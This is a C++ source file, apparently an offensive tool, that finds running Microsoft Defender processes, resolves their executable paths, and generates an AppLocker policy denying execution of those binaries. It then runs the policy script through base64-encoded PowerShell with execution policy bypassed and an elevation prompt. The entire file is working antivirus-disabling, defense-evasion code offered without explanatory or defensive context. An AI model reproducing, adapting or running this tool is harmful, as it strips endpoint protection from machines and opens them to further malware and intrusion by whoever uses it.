#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <iostream>
#include <string>
#include "ntdefs.h"
#include <TlHelp32.h>
#include <vector>



#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define CYAN    "\x1b[36m"
#define YELLOW  "\x1b[33m"
#define RESET   "\x1b[0m"


std::vector<std::wstring> g_Win32Paths;

// Can be extended 
const wchar_t* targetNames[] =
{

    L"MpDefenderCoreService.exe",
    L"MsMpEng.exe",
    L"WinDefend.exe",
};

const size_t targetCount = sizeof(targetNames) / sizeof(targetNames[0]);


const wchar_t* g_PowerShellBody = LR"(


# Only use if the service AppIDSvc and AppID is not enabled 
# sc.exe config AppID start=system
# sc.exe config AppIDSvc start=auto
# sc.exe start AppIDSvc


# Validate input paths
foreach ($exe in $ExeToBlock) {
    if (!(Test-Path $exe)) {
        Write-Host '[!] ERROR: File does not exist:' $exe -ForegroundColor Red
        exit 1
    }
}

# Create unique GUIDs for static rules
$guidAllowExeSigned   = [guid]::NewGuid().ToString()
$guidAllowExeAllPath  = [guid]::NewGuid().ToString()
$guidAllowMsiSigned   = [guid]::NewGuid().ToString()
$guidAllowMsiAllPath  = [guid]::NewGuid().ToString()
$guidAllowScript      = [guid]::NewGuid().ToString()
$guidAllowAppx        = [guid]::NewGuid().ToString()

# Build dynamic block rules
$dynamicBlockRules = ''

foreach ($exe in $ExeToBlock) {
    $id   = [guid]::NewGuid().ToString()
    $name = Split-Path $exe -Leaf

    $dynamicBlockRules += '<FilePathRule Id="' + $id + '" Name="Block ' + $name + '" Description="Blocked by policy" UserOrGroupSid="S-1-1-0" Action="Deny">'
    $dynamicBlockRules += '<Conditions><FilePathCondition Path="' + $exe + '" /></Conditions>'
    $dynamicBlockRules += '</FilePathRule>'
}

$xml = @"
<AppLockerPolicy Version="1">

  <RuleCollection Type="Appx" EnforcementMode="NotConfigured">
    <FilePublisherRule Id="$guidAllowAppx" Name="Allow All Appx" Description="OK" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*">
          <BinaryVersionRange LowSection="0.0.0.0" HighSection="*" />
        </FilePublisherCondition>
      </Conditions>
    </FilePublisherRule>
  </RuleCollection>

  <RuleCollection Type="Dll" EnforcementMode="NotConfigured" />

  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePublisherRule Id="$guidAllowExeSigned" Name="Allow All Signed EXEs" Description="OK" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*">
          <BinaryVersionRange LowSection="*" HighSection="*" />
        </FilePublisherCondition>
      </Conditions>
    </FilePublisherRule>

$dynamicBlockRules

    <FilePathRule Id="$guidAllowExeAllPath" Name="Allow All Other EXEs" Description="Fallback allow" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePathCondition Path="*" />
      </Conditions>
    </FilePathRule>

    <RuleCollectionExtensions>
      <ThresholdExtensions><Services EnforcementMode="Enabled" /></ThresholdExtensions>
      <RedstoneExtensions><SystemApps Allow="Enabled" /></RedstoneExtensions>
    </RuleCollectionExtensions>
  </RuleCollection>

  <RuleCollection Type="Msi" EnforcementMode="NotConfigured">
    <FilePublisherRule Id="$guidAllowMsiSigned" Name="Allow All Signed MSIs" Description="OK" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*">
          <BinaryVersionRange LowSection="*" HighSection="*" />
        </FilePublisherCondition>
      </Conditions>
    </FilePublisherRule>

    <FilePathRule Id="$guidAllowMsiAllPath" Name="Allow All MSI Paths" Description="OK" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePathCondition Path="*" />
      </Conditions>
    </FilePathRule>
  </RuleCollection>

  <RuleCollection Type="Script" EnforcementMode="NotConfigured">
    <FilePathRule Id="$guidAllowScript" Name="Allow All Scripts" Description="OK" UserOrGroupSid="S-1-1-0" Action="Allow">
      <Conditions>
        <FilePathCondition Path="*" />
      </Conditions>
    </FilePathRule>
  </RuleCollection>

</AppLockerPolicy>
"@

$tempPath = [System.IO.Path]::GetTempFileName()
Set-Content -Path $tempPath -Value $xml -Encoding UTF8

Write-Host '[*] Applying AppLocker policy...'
Set-AppLockerPolicy -XmlPolicy $tempPath -ErrorAction Stop


Remove-Item $tempPath -Force
gpupdate /force | Out-Null

Write-Host '[+] AppLocker policy applied. Blocked EXEs:' -ForegroundColor Green
$ExeToBlock | ForEach-Object { Write-Host ('  -> ' + $_) -ForegroundColor Green }

Read-Host "Press ENTER to exit"
)";



typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
    );

std::wstring ForceHarddiskVolumeToC(const std::wstring& ntPath)
{
    const std::wstring prefix = L"\\Device\\HarddiskVolume3\\";

    if (ntPath.rfind(prefix, 0) == 0)
    {
        
        std::wstring rest = ntPath.substr(prefix.length());
        return L"C:\\" + rest;
    }

    return ntPath; 
}


bool FuncNtQuerySystemInformation(ULONGLONG PID)
{
    NTSTATUS status;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll)
        return false;

    _NtQuerySystemInformation NtQuerySystemInformation =
        (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
        return false;

    void* allocBuffer = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, 1024);
    if (!allocBuffer)
        return false;

    SYSTEM_PROCESS_ID_INFORMATION spi = { 0 };
    spi.ProcessId = PID;
    spi.ImageName.MaximumLength = 1024;
    spi.ImageName.Buffer = (PWSTR)allocBuffer;

    status = NtQuerySystemInformation(
        SystemProcessIdInformation,
        &spi,
        sizeof(spi),
        0
    );

    if (status != 0)
    {
        printf(RED "    [-] Query failed (NTSTATUS: 0x%08X)\n" RESET, status);
        LocalFree(allocBuffer);
        return false;
    }

    
    std::wstring originalPath(spi.ImageName.Buffer, spi.ImageName.Length / sizeof(WCHAR));

 
   
    std::wstring ntPath(spi.ImageName.Buffer, spi.ImageName.Length / sizeof(WCHAR));
    std::wstring win32Path = ForceHarddiskVolumeToC(ntPath);

    g_Win32Paths.push_back(win32Path);

    printf(YELLOW "    ImagePath (NT):     " RESET "%ws\n", ntPath.c_str());
    printf(YELLOW "    ImagePath (Win32):  " GREEN "%ws\n" RESET, win32Path.c_str());


    LocalFree(allocBuffer);
    return true;
}


bool isTargetProcess(const wchar_t* exeName)
{
    for (size_t i = 0; i < targetCount; i++)
    {
        if (_wcsicmp(exeName, targetNames[i]) == 0)
            return true;
    }
    return false;
}

void findTargetsAndQueryPaths()
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do
        {
            if (isTargetProcess(pe.szExeFile))
            {
                printf(
                    GREEN "[+] Found Target Process\n" RESET
                    YELLOW "    Name:  " RESET "%ws\n"
                    YELLOW "    PID:   " RESET "%lu\n",
                    pe.szExeFile,
                    pe.th32ProcessID
                );
                printf("\n");
                FuncNtQuerySystemInformation(pe.th32ProcessID);
            }

        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
}

std::wstring BuildPowerShellArray()
{
    if (g_Win32Paths.empty())
        return L"";

    std::wstring output;

    for (size_t i = 0; i < g_Win32Paths.size(); i++)
    {
        output += L"\\\"" + g_Win32Paths[i] + L"\\\"";

        if (i + 1 < g_Win32Paths.size())
            output += L","; 
    }

    return output;
}

std::wstring BuildPowerShellExeArray()
{
    if (g_Win32Paths.empty())
        return L"@()";

    std::wstring result = L"@(";
    for (size_t i = 0; i < g_Win32Paths.size(); ++i)
    {
        result += L"\"";
        result += g_Win32Paths[i];
        result += L"\"";

        if (i + 1 < g_Win32Paths.size())
            result += L",";
    }
    result += L")";
    return result;
}


std::wstring BuildFullPowerShellScript()
{
    std::wstring script;
    std::wstring arrayExpr = BuildPowerShellExeArray();

    script += L"$ExeToBlock = ";
    script += arrayExpr;
    script += L"\n";
    script += g_PowerShellBody;

    return script;
}

std::wstring Base64Encode(const BYTE* data, size_t len)
{
    static const wchar_t* base64_chars =
        L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::wstring result;
    result.reserve((len + 2) / 3 * 4);

    for (size_t i = 0; i < len; i += 3)
    {
        unsigned char b1 = data[i];
        unsigned char b2 = (i + 1 < len) ? data[i + 1] : 0;
        unsigned char b3 = (i + 2 < len) ? data[i + 2] : 0;

        unsigned int triple = (b1 << 16) | (b2 << 8) | b3;

        result.push_back(base64_chars[(triple >> 18) & 0x3F]);
        result.push_back(base64_chars[(triple >> 12) & 0x3F]);

        if (i + 1 < len)
            result.push_back(base64_chars[(triple >> 6) & 0x3F]);
        else
            result.push_back(L'=');

        if (i + 2 < len)
            result.push_back(base64_chars[triple & 0x3F]);
        else
            result.push_back(L'=');
    }

    return result;
}


void RunPowerShellInMemory()
{
    if (g_Win32Paths.empty())
    {
        printf("[-] No Win32 paths collected, skipping PowerShell.\n");
        return;
    }

    std::wstring script = BuildFullPowerShellScript();

    const BYTE* bytes = reinterpret_cast<const BYTE*>(script.c_str());
    size_t byteLen = script.size() * sizeof(wchar_t);

    std::wstring encoded = Base64Encode(bytes, byteLen);

    std::wstring params = L"-NoProfile -ExecutionPolicy Bypass -EncodedCommand ";
    params += encoded;


    ShellExecuteW(
        NULL,
        L"runas",            // Admin
        L"powershell.exe",
        params.c_str(),
        NULL,
        SW_SHOW
    );
}


int main()
{

    findTargetsAndQueryPaths();

    std::wstring psArg = BuildPowerShellArray();

    if (!psArg.empty())
    {
        wprintf(L"\n" CYAN L"[+] PowerShell Input: " RESET L"%ws\n", psArg.c_str());
        RunPowerShellInMemory();
    }
    else
    {
        printf(RED "[-] No paths found.\n" RESET);
    }

    getchar();

    return 0;
}
